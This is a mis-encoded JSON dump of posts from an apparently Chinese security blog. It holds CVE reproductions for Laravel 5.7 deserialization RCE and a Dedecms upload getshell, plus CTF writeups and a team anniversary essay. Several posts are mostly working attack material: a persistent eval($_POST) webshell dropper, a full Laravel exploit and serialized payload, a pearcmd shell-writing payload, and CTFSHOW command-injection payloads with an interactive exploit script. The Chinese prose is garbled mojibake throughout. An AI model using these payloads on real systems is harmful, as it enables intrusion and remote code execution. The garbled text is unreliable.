if(md5_file('{name}')==='912d7b3bbd5cf7405c9cc8f16156321b'){ }else{ file_put_contents('{name}',base64_decode('PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtoM10pKTs/Pg==')); } }else{ if(file_exists('{name}')){ unlink('{name}'); } } } ?&gt;","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"CVE-2019-9081 Laravel5.7 ååºåˆ—åŒ– RCE","slug":"CVE-2019-9081 Laravel5.7 ååºåˆ—åŒ– RCE","date":"2021-11-16T02:34:48.025Z","updated":"2021-11-16T02:37:26.243Z","comments":true,"path":"posts/598866b.html","link":"","permalink":"http://h3geeker.top/posts/598866b.html","excerpt":"","text":"CVE-2019-9081 Laravel5.7 ååºåˆ—åŒ– RCEä¸€ã€æ¼æ´ç®€ä»‹Laravel Framework 5.7.xç‰ˆæœ¬ä¸­çš„Illuminateç»„ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»£ç  äºŒã€æ¼æ´å½±å“Laravel5.7 ä¸‰ã€æ¼æ´åˆ†ælaravelåœ¨5.7ä¹‹ååŠ å…¥äº†PendingCommandç±»ï¼ŒåŒæ—¶å‘ç°äº†ä¸¤ä¸ªæ–¹æ³• PendingCommandç±»æœ‰é­”æœ¯æ–¹æ³•__destruct()ï¼Œè¯¥æ–¹æ³•è°ƒç”¨runå‡½æ•°ï¼Œç„¶årunå‡½æ•°æ‰§è¡Œå‘½ä»¤ æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹æ„é€ æ–¹æ³• ä¸€å…±éœ€è¦ç”¨åˆ°4ä¸ªå±æ€§ æˆ‘ä»¬ç»§ç»­è·Ÿè¿›runæ–¹æ³•çœ‹ä¸€ä¸‹ æ³¨æ„$this-&gt;mockConsoleOutput(); æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹ ç»§ç»­è·Ÿè¿›createABufferedOutputMock() ç»§ç»­èµ°ä¸‹å»ï¼Œæˆ‘ä»¬éœ€è¦å±æ€§$this-&gt;test-&gt;expectedOutput æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç±»ä¸­ç”¨expectedOutput ç»è¿‡å…¨å±€æœç´¢ï¼Œåœ¨Illuminate\\Foundation\\Testing\\Concernsï¼Œå­˜åœ¨ ä½†æ˜¯è¿™ç§ç±»ï¼Œéœ€è¦ç”¨é­”æ³•æ–¹æ³•getï¼Œæ¥å®ä¾‹åŒ– åœ¨vendor/laravel/framework/src/Illuminate/Auth/GenericUser.phpä¸­å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„getæ–¹æ³• è®¾ç½®é”®åä¸ºexpectedOutputçš„æ•°ç»„ï¼Œå³å¯åˆ©ç”¨ ç°åœ¨å°±ç¼º$appå‚æ•°ï¼Œæˆ‘ä»¬å›å»æ¥ç€è·Ÿè¿›runæ–¹æ³• è¿™é‡Œä¹Ÿå¾ˆé‡è¦ $this-&gt;app[Kernel::class] è¿™é‡Œåœ¨å®ä¾‹åŒ–å¯¹è±¡,å†å»è°ƒå¯¹åº”çš„callæ–¹æ³•ï¼Œè·Ÿç€Kerneå¯ä»¥çœ‹åˆ°æ˜¯åœ¨å®ä¾‹åŒ– Illuminate\\Contracts\\Console\\Kernel é¦–å…ˆè¿›å…¥åˆ° è·Ÿè¿›makeæ–¹æ³• è·Ÿè¿›çˆ¶ç±»çš„make è·Ÿè¿›resolve é‚£ä¹ˆæ­¤æ—¶å‘ç°$concreteçš„å€¼æ¥è‡ªäºgetConcrete($abstract): vendor/laravel/framework/src/Illuminate/Container/Container.php è·Ÿè¿›getConcrete æ³¨æ„è¿™é‡Œ if (isset($this-&gt;bindings[$abstract])) { return $this-&gt;bindings[$abstract]['concrete']; } å¦‚æœbindings[$abstract]å­˜åœ¨ï¼Œåˆ™ä¼šè¿”å›bindings[$abstract][â€˜concreteâ€™] bindingsæ˜¯ç±»Containerçš„å±æ€§ï¼Œå¹¶ä¸”ç±»Containerä¸­ä¹Ÿæœ‰å¯ä»¥RCEçš„callæ–¹æ³•ã€‚ åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ•´ç†ä¸€ä¸‹æ€è·¯ æˆ‘ä»¬å¯ä»¥ä»»æ„å®ä¾‹åŒ–ç±»Containerçš„å­ç±»ï¼Œè¿™æ ·åœ¨å…¶å­ç±»è°ƒç”¨callçš„æ—¶å€™ï¼Œä¼šè§¦å‘ç±»Containerçš„callæ–¹æ³•ï¼Œé‚£ä¹ˆå³å¯è¾¾æˆRCE æˆ‘ä»¬é€‰æ‹©Illuminate\\Foundation\\Applicationè€Œ$abstractçš„å€¼ä¸ºIlluminate\\Contracts\\Console\\Kernelã€‚é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å®¹æ˜“çŸ¥é“$bindingsåªè¦å­˜åœ¨é”®åä¸ºIlluminate\\Contracts\\Console\\Kernelçš„æ•°ç»„ï¼Œå°±èƒ½è¿›å…¥è¯¥ifæ¡ä»¶å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æŒ‰å¦‚ä¸‹è¿›è¡Œæ„é€ ï¼š 1.ç±»PendingCommand åˆ©ç”¨ destructè§¦å‘run()æ–¹æ³• 2.ç±»vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php æ„é€ æ•°ç»„ 3.ç±»vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php åˆ©ç”¨ get()é­”æ³•æ–¹æ³•æ»¡è¶³mockConsoleOutput 4.åˆ©ç”¨ä»»æ„å®ä¾‹åŒ–å¯¹è±¡ï¼Œå®ä¾‹åŒ–Illuminate\\Foundation\\Application 5.è°ƒç”¨callè§¦å‘çˆ¶ç±»callæ–¹æ³•RCE expå¦‚ä¸‹: &lt;?php namespace Illuminate\\Foundation\\Testing{ class PendingCommand{ protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app){ $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; } } } namespace Illuminate\\Auth{ class GenericUser{ protected $attributes; public function __construct(array $attributes){ $this-&gt;attributes = $attributes; } } } namespace Illuminate\\Foundation{ class Application{ protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind){ $this-&gt;bindings=$bind; } } } namespace{ $genericuser = new Illuminate\\Auth\\GenericUser(array(\"expectedOutput\"=&gt;array(\"0\"=&gt;\"1\"),\"expectedQuestions\"=&gt;array(\"0\"=&gt;\"1\"))); $application = new Illuminate\\Foundation\\Application(array(\"Illuminate\\Contracts\\Console\\Kernel\"=&gt;array(\"concrete\"=&gt;\"Illuminate\\Foundation\\Application\"))); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand(\"phpinfo\",array('1'),$genericuser,$application); echo urlencode(serialize($pendingcommand)); } ?&gt; å››ã€æ¼æ´å¤ç°åœ¨routes/web.phpæ·»åŠ ä¸€æ¡è·¯ç”± Route::get('/index', 'TaskController@index'); æ¥ä¸‹æ¥åœ¨app/Http/Controllersæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºæ–‡ä»¶TaskController.phpï¼Œæºç å¦‚ä¸‹: &lt;?php namespace App\\Http\\Controllers; highlight_file(__FILE__); class TaskController { public function index(){ if(isset($_GET['code'])) { $code=$_GET['code']; unserialize($code); return \"Welcome to H3'palce\"; } } } ?&gt; åˆ©ç”¨expç”Ÿæˆpayload ç„¶åä¼ å€¼è¿‡å» payloadï¼š http://127.0.0.1/public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D äº”ã€æ¼æ´ä¿®å¤1ã€åˆ é™¤__destructä¸­çš„$this-&gt;run()ä»£ç æ®µ 2ã€æ›´æ–°åˆ°æ–°ç‰ˆæœ¬","categories":[{"name":"CVEå¤ç°","slug":"CVEå¤ç°","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVEæ¼æ´å¤ç°","slug":"CVEæ¼æ´å¤ç°","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CVE-2019-9081","slug":"CVE-2019-9081","permalink":"http://h3geeker.top/tags/CVE-2019-9081/"}]},{"title":"Nepnepä¸¤å²ç”Ÿæ—¥","slug":"Nepnepä¸¤å‘¨å¹´","date":"2021-11-15T14:27:46.711Z","updated":"2021-11-16T02:19:11.273Z","comments":true,"path":"posts/ba1d201b.html","link":"","permalink":"http://h3geeker.top/posts/ba1d201b.html","excerpt":"","text":"ä»Šå¤©æ˜¯Nepnepè”åˆæˆ˜é˜Ÿçš„2å²ç”Ÿæ—¥ï¼Œä¹Ÿæ˜¯æˆ‘æ¥åˆ°è¿™ä¸ªæˆ˜é˜Ÿçš„ç¬¬8ä¸ªæœˆï¼Œä¹Ÿæ˜¯æˆ‘è¸å…¥å®‰å…¨è¿™ä¸ªè¡Œä¸šçš„ç¬¬8ä¸ªæœˆï¼Œæˆ‘å¾ˆç¬¨ï¼Œåˆ«äººå­¦ä¹ ä¸€ä¸ªå°æ—¶çš„çŸ¥è¯†ï¼Œæˆ‘éœ€è¦å­¦ä¹ 1å°å¤©ï¼Œå‰åæ–Ÿé…Œäº†å¾ˆä¹…ä¹Ÿæ²¡æƒ³å¥½è¦ä¸è¦è¸å…¥ç½‘ç»œå®‰å…¨è¿™ä¸€è¡Œä¸šï¼Œå½“æ—¶æˆ‘åªæ˜¯ä¸€ä¸ªå¹³å¹³æ— å¥‡çš„å¤§äºŒå­¦ç”Ÿï¼Œæˆç»©ä¸€èˆ¬ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç‰¹é•¿ï¼Œæ­£åœ¨çŠ¹è±«ä¸å†³çš„æ—¶å€™ï¼Œæ­£å¥½èµ¶ä¸Šäº†2021Nepctfï¼ŒæŠ±ç€è¯•ä¸€è¯•çš„æ€åº¦ï¼Œæˆ‘å‚åŠ äº†æ¯”èµ›ï¼Œä¸å‡ºæ‰€æ–™ï¼Œå·®ä¸€ç‚¹è¿ç­¾åˆ°éƒ½æ²¡ç­¾ä¸Šï¼Œæ­£å¥½èŠ±èŠ±åœ¨ç¾¤é‡Œæ‹›æ–°ï¼Œæˆ‘å°±å°è¯•äº†ä¸€ä¸‹ï¼Œæ„Ÿè°¢Nepnepæ”¶ç•™äº†æˆ‘ï¼Œè®©æˆ‘è¿™ä¸ªæ·±å¤„é›¾é‡Œçš„å°èœé¸¡æœ‰äº†å®¶ï¼Œæœ‰äº†å®¶å°±æœ‰äº†ä¾é ï¼Œåœ¨è¿™ä¸ªå¤§å®¶åº­é‡Œæˆ‘é‡åˆ°äº†å¥½å¤šå¥½æœ‹å‹ï¼Œåšå­¦çš„å‚…æ€»ï¼Œæˆ‘ä»¬çš„åå¥³äººèŠ±èŠ±å§ï¼ŒåŠæ¯›HRPï¼ŒåŠæ¯›äºŒå·é˜¿æ¯›ï¼Œå¸…æ°”çš„çˆ±è‹¥ï¼Œä¸€ç›´æƒ³gayæˆ‘çš„é©¹ä»”ï¼Œç¥ç§˜çš„å¼€å¿ƒå¸ˆçˆ¶ï¼Œæˆ‘ä»¬çš„å¥½å§å§è´å¡”ï¼Œå¤§åè›‹sharunï¼Œç¥ç§˜çš„Tç¥ç­‰ç­‰â€¦å¾ˆå¤šå¾ˆå¤šæˆ‘å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œå¤§å®¶ä¸€èµ·ä¸ºè‡ªå·±çƒ­çˆ±çš„æ‹¼æç€ï¼Œä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·å˜»å˜»å“ˆå“ˆï¼Œ ä¸€èµ·æ‰“æ¯”èµ›ï¼Œæœ‰è‹¦æœ‰ä¹ï¼Œæœ‰å¼€å¿ƒä¹Ÿæœ‰å¤±è½ï¼Œæˆ‘ä»¬éƒ½åœ¨æ…¢æ…¢çš„æˆé•¿ï¼Œä»ä¸€æ— æ‰€çŸ¥çš„èœé¸¡ï¼Œæ…¢æ…¢èƒ½å¤Ÿåœ¨æ¯”èµ›ä¸­æœ‰æ‰€è¾“å‡ºï¼Œè¿˜è®°å¾—åœ¨ç¥¥äº‘æ¯ç†¬å¤œå¥‹æˆ˜ï¼Œè™½ç„¶æœ€åå¤§å®¶æ²¡æœ‰æ¥åˆ°é•¿æ˜¥ä¼šå’Œï¼Œä½†æ˜¯æˆ‘ä»¬éƒ½ä»å¤±æ„ä¸­è·å¾—æ•™è®­ï¼Œæ¯æ¬¡ä¸€åˆ°å¤§å‹æ¯”èµ›ï¼Œå°±èƒ½çœ‹åˆ°ç¾¤é‡Œå¤§å¸ˆçˆ¶ä»¬çªç„¶å‡ºç°ï¼Œæ‰›èµ·å¤§æ——ï¼Œé¦–å½“å…¶å†²ï¼Œæˆ‘æ¯æ¯éƒ½å¾ˆç¾¡æ…•ï¼Œä¹Ÿå¾ˆæ„§ç–šï¼Œéš¾è¿‡è‡ªå·±èƒ½åŠ›ä¸è¶³ä¸å¸®åŠ©æˆ˜é˜Ÿï¼Œä¹Ÿå¾ˆæœ‰å‹åŠ›ï¼Œå¤§å¸ˆçˆ¶ä»¬ä¸èƒ½ä¸€ç›´éƒ½åœ¨ï¼Œæ€»æœ‰ä¸€å¤©å¤§æ——ä¼šäº¤åˆ°æˆ‘ä»¬çš„æ‰‹é‡Œï¼Œæ‰€ä»¥ï¼Œæˆ‘è¿˜æ˜¯è¦åŠªåŠ›å­¦ä¹ ï¼Œå¿«é€Ÿæˆé•¿ï¼Œä¸è¾œè´Ÿå‰è¾ˆçš„æœŸæœ›ã€‚å›é¦–è¿™8ä¸ªæœˆï¼Œæˆ‘æ”¶è·äº†çŸ¥è¯†ï¼Œæ”¶è·äº†è£èª‰ï¼Œæ›´é‡è¦çš„æ˜¯æˆ‘æ”¶è·åˆ°äº†ä¸€ç¾¤æœ‰ç€ç›¸åŒçˆ±å¥½çš„å°ä¼™ä¼´å’Œå¤§å“¥å“¥å¤§å§å§ä»¬ï¼Œè°¢è°¢ä½ ä»¬ç»™æˆ‘å¸®åŠ©å’Œæ”¯æŒï¼Œè®©æˆ‘åœ¨è¿™æ¡è·¯ä¸Šèƒ½å¤ŸåšæŒä¸‹å»ï¼Œè®¤è¯†æˆ‘éƒ½æœ‰ç‚¹äº†è§£ï¼Œæˆ‘è¿™ä¸ªå­¦æ ¡å‡ ä¹æ²¡æœ‰ä»äº‹å®‰å…¨è¡Œä¸šçš„åŒå­¦ï¼Œå¦‚æœä½ ä»¬çš„æ”¯æŒï¼Œæˆ‘å¯èƒ½æ—©å°±åœ¨è¿™æ¡è·¯ä¸Šæ”¾å¼ƒäº†ï¼Œæ”¾å¼ƒè‡ªå·±çƒ­çˆ±çš„ä¸œè¥¿ï¼Œæ¥æ€è€ƒç°å®ï¼Œä¹Ÿæ„Ÿè°¢ä¸€è·¯ä»¥æ¥ç»™äºˆæˆ‘å¸®åŠ©çš„å¸ˆå‚…ä»¬ï¼Œä½ ä»¬æ²¡æœ‰è®¨åŒæˆ‘å‚»xä¸€æ ·çš„é—®é¢˜ï¼Œå¹¶ä¸”èƒ½å¤Ÿç»†å¿ƒçš„è§£ç­”æˆ‘çš„å›°æƒ‘ï¼ŒåŒæ—¶æˆ‘ä¹Ÿè¦æ„Ÿè°¢ä¸€ä¸‹æˆ‘çš„å¥³æœ‹å‹ï¼Œå¥¹å¹¶éè®¡ç®—æœºä¸“ä¸šï¼Œå´çŸ¥é“æˆ‘åœ¨å­¦ä¹ ä»€ä¹ˆä»äº‹ä»€ä¹ˆï¼Œè™½ç„¶ä¸èƒ½æŠ€æœ¯ä¸Šå¸®åŠ©æˆ‘ï¼Œä½†æ˜¯ç²¾ç¥ä¸Šå¯¹æˆ‘å¾ˆæ˜¯æ”¯æŒã€‚æˆ‘å¾ˆåº†å¹¸æˆ‘èƒ½æ‹¥æœ‰è¿™ä¹ˆä¸€ç¾¤å¥½æœ‹å‹ï¼Œæˆ‘ä¹Ÿå¾ˆåº†å¹¸æˆ‘èƒ½å¤Ÿè¢«è¿™ä¹ˆå¤šäººå–œæ¬¢ï¼Œæˆ‘ä¹Ÿå¾ˆåº†å¹¸æˆ‘æœ‰ä¸€ä¸ªçŸ¥ä¹¦è¾¾ç†çš„å¥³æœ‹å‹ï¼Œæœ€åå¸Œæœ›å¤§å®¶éƒ½èƒ½å¤Ÿåœ¨è¿™æ¡è·¯ä¸Šè¶Šèµ°è¶Šå¥½ï¼ŒåŒæ—¶ä¹Ÿç¥æ„¿Nepnepè”åˆæˆ˜é˜Ÿä¸¤å²ç”Ÿæ—¥å¿«ä¹ï¼","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"http://h3geeker.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"http://h3geeker.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"2021æ¹–æ¹˜æ¯webéƒ¨åˆ†wp","slug":"2021æ¹–æ¹˜æ¯web","date":"2021-11-14T13:30:22.000Z","updated":"2021-11-14T13:30:58.263Z","comments":true,"path":"posts/a17e1508.html","link":"","permalink":"http://h3geeker.top/posts/a17e1508.html","excerpt":"","text":"easywillæœ¬äººsbï¼Œå†™å¥½çš„wpè¢«çªåˆ æ‰äº†QAQ å¾ˆç®€å•çš„ä¸€é“é¢˜åŒ…å«pearcmd.phpï¼ˆå®¡è®¡ä¸€ä¸‹æºç å°±èƒ½çœ‹åˆ°ï¼‰ å¥½åƒç«äº‰ä¸Šä¼ ä¹Ÿå¯ä»¥ï¼ˆæ²¡è¯•ï¼‰ payloadè¿˜è®°å¾— /index.php?+config-create+/&amp;&amp;name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php å†™å…¥ç„¶ååŒ…å«ä¸€ä¸‹å°±è¡Œ Pentest in Autumnç»™äº†é™„ä»¶ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯shiroæ¡†æ¶ ç¬¬ä¸€ååº”å°±æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰actuatoræœªæˆæƒè®¿é—®æ¼æ´ è¿™æ ·æ‹¿åˆ°keyå°±å¯ä»¥å·¥å…·ä¸€æŠŠæ¢­å“ˆ è®¿é—®/actuatorè·¯ç”±ï¼Œæœ‰å¦‚ä¸‹å†…å®¹ ç»§ç»­è®¿é—®heapdumpï¼Œå‘ç°è·³åˆ°äº†404 åˆ°è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œåæ¥æƒ³åˆ°èƒ½ä¸èƒ½ç»•è¿‡ä¸€ä¸‹ åˆçœ‹åˆ°Shiro &lt; 1.5.2 æƒ³åˆ°shiroæƒé™ç»•è¿‡ CVE-2020-1957 https://blog.csdn.net/weixin_50464560/article/details/120752809 éšå³æ„é€ url /;/actuator/heapdump æˆåŠŸä¸‹è½½åˆ°heapdumpæ–‡ä»¶ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾keyçš„è¿‡ç¨‹ https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html å‚è€ƒæ­¤æ–‡ç« åˆ©ç”¨visualvmå·¥å…·æˆåŠŸæ‹¿åˆ°äº†key ç„¶ååˆ©ç”¨shiro attack å·¥å…·ï¼Œä¸€æŠŠæ¢­","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"å¤§èµ›wp","slug":"å¤§èµ›wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"CVE-2019-8362 Dedecms v5.7 sp2 åå°æ–‡ä»¶ä¸Šä¼  getshell","slug":"CVE-2019-8362 Dedecms v5.7 sp2 åå°æ–‡ä»¶ä¸Šä¼  getshell","date":"2021-11-14T03:35:22.000Z","updated":"2021-11-14T07:58:22.767Z","comments":true,"path":"posts/f676a4bd.html","link":"","permalink":"http://h3geeker.top/posts/f676a4bd.html","excerpt":"","text":"CVE-2019-8362 Dedecms v5.7 sp2 åå°æ–‡ä»¶ä¸Šä¼  getshellä¸€ã€æ¼æ´ç®€ä»‹ä¸Šä¼ zipæ–‡ä»¶è§£å‹ç¼©å¯¹äºæ–‡ä»¶åè¿‡æ»¤ä¸å‘¨ï¼Œå¯¼è‡´getshell äºŒã€æ¼æ´å½±å“Dedecms v5.7 sp2 ä¸‰ã€æ¼æ´åŸç†åœ¨dede/album_add.phpçš„175è¡Œä¸ºä¸Šä¼ æ–‡ä»¶åç¼€éªŒè¯ è·Ÿè¿›GetMatchFiles()å‡½æ•° function GetMatchFiles($indir, $fileexp, &amp;$filearr) { $dh = dir($indir); while($filename = $dh-&gt;read()) { $truefile = $indir.'/'.$filename; if($filename == \".\" || $filename == \"..\") { continue; } else if(is_dir($truefile)) { $this-&gt;GetMatchFiles($truefile, $fileexp, $filearr); } else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) { $filearr[] = $truefile; } } $dh-&gt;close(); } åœ¨è¿™è¡ŒéªŒè¯ä¸­å¯ä»¥çœ‹åˆ° preg_match(\"/.(\".$fileexp.\")/i\",$filename) åªæ˜¯åˆ¤æ–­äº†æ–‡ä»¶åä¸­æ˜¯å¦å­˜åœ¨.jpgã€.pngã€.gifä¸­çš„ä¸€ä¸ª æˆ‘ä»¬å¯ä»¥æ„é€ 1.jpg.phpæ¥è¿›è¡Œbypass å››ã€æ¼æ´å¤ç°åœ¨æœ¬åœ°å­˜æ”¾ä¸€ä¸ªphpæ¢é’ˆå‘½åä¸º1.jpg.phpå°†å…¶å‹ç¼©ä¸ºzip ç„¶ååœ¨åå°çš„å¸¸ç”¨æ“ä½œ-æ–‡ä»¶å¼ç®¡ç†å™¨å¤„ä¸Šä¼ å‹ç¼©æ–‡ä»¶åˆ°softç›®å½•ä¸‹ å°†1.jpg.zipä¸Šä¼ åˆ°softç›®å½• ç„¶ååœ¨dede/album_add.phpä¸­æ–°å»ºä¸€ä¸ªå›¾é›† ä¸Šä¼ æˆåŠŸåç‚¹å‡»é¢„è§ˆæ–‡æ¡£ æˆåŠŸåç‚¹å‡»é¢„è§ˆä¸­çš„è¶…é“¾æ¥ æˆåŠŸæ–‡ä»¶ä¸Šä¼ ï¼Œå¦‚æœå°†å…¶æ¢æˆwebshellå³å¯getshell äº”ã€æ¼æ´ä¿®å¤1ã€æŠŠ/dede/file_class.phpä¸­çš„ else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) ä¿®æ”¹ä¸ºï¼š else if(substr($filename, -strlen($fileexp))===$fileexp) 2ã€åŠæ—¶æ›´æ–°ç‰ˆæœ¬","categories":[{"name":"CVEå¤ç°","slug":"CVEå¤ç°","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVEæ¼æ´å¤ç° , CVE-2019-8362","slug":"CVEæ¼æ´å¤ç°-CVE-2019-8362","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/"}]},{"title":"CTFSHOWå‘½ä»¤æ‰§è¡Œ","slug":"CTFshowå‘½ä»¤æ‰§è¡Œwp","date":"2021-11-11T03:35:22.000Z","updated":"2021-12-10T15:47:56.661Z","comments":true,"path":"posts/62244cdb.html","link":"","permalink":"http://h3geeker.top/posts/62244cdb.html","excerpt":"","text":"CTFSHOWå‘½ä»¤æ‰§è¡Œweb29è¿‡æ»¤äº†flag payloadï¼š éšä¾¿å†™å‡ ä¸ªå§¿åŠ¿ /?c=system(\"nl fl??????\"); /?c=system(\"nl fl*\"); /?c=system(\"nl fla''g.php\"); /?c=echo `nl fla\"\"g.php`; /?c=echo `nl fla\\g.php`; /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); å‰©ä¸‹çš„æˆ‘ä¸ä¼šäº† ##web30 è¿‡æ»¤äº†flag|system|php ç”¨echo åå¼•å·æ¥æ‰§è¡Œå‘½ä»¤ payloadï¼š /?c=echo `nl fla\"\"g.p\"\"hp`; /?c=echo `nl fla?????`; /?c=echo `nl f*`; /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php web31è¿‡æ»¤äº†flag|system|php|cat|sort|shell|\\.| | æ²¡å…³ç³»ï¼Œæˆ‘ä»¬æœ‰éƒ½æ˜¯å§¿åŠ¿ payloadï¼š /?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__))))); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); ##web32 includeä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨?&gt;ä»£æ›¿ã€‚ payloadï¼š /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; /?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web33-36payloadï¼š /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; /?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web37&lt;?php //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } payloadï¼š /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== /?c=data://text/palin,&lt;?php system(\"nl fla*\");?&gt; web38è¿‡æ»¤äº†flag payloadï¼š /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== web39payloadï¼š /?c=data://text/palin,&lt;?php%20system(\"nl%20f*\");?&gt; web40ç†è®ºä¸Šæ˜¯å¼‚æˆ– ç„¶åæˆ‘æ‡’ è´´expï¼š import re content = '' preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/' for i in range(256): for j in range(256): if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)): k = i | j if k&gt;=32 and k&lt;=126: a = '%' + hex(i)[2:].zfill(2) b = '%' + hex(j)[2:].zfill(2) content += (chr(k) + ' '+ a + ' ' + b + '\\n') f = open('rce_or.txt', 'w') f.write(content) # -*- coding: utf-8 -*- import requests import urllib from sys import * import os os.system(\"php rce_or.php\") #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ if(len(argv)!=2): print(\"=\"*50) print('USERï¼špython exp.py &lt;url&gt;') print(\"egï¼š python exp.py http://ctf.show/\") print(\"=\"*50) exit(0) url=argv[1] def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"rce_or.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\")) data={ 'c':urllib.parse.unquote(param) } r=requests.post(url,data=data) print(\"\\n[*] result:\\n\"+r.text) expå–è‡ªhttps://wp.ctf.show/d/137-ctfshow-web-web41/4 web41payload: /?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); web42/dev/null 